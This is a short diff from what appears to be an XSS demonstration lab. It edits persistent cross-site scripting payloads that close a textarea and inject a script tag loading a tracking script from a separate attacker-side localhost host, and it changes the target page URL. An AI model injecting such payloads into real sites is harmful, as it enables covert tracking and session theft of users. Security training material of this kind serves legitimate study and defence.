@@ -73,4 +73,4 @@ log({event:'click', 'href': this.href});
 </textarea><script src="http://html5-attack.localhost/persistent_xss/track.js"></script>
 
 == configurable log - start at login
-</textarea><script src="http://html5-attack.localhost/persistent_xss/track.js?start=http%3A%2F%2Fhtml5.localhost%2Fpersistent_xss%2Fvuln.php%3Fpage%3Dlogin"></script>
+</textarea><script src="http://html5-attack.localhost/persistent_xss/track.js?start=http%3A%2F%2Fhtml5.localhost%2Fpersistent_xss%2Fvuln%2Findex.php%3Fpage%3Dlogin"></script>
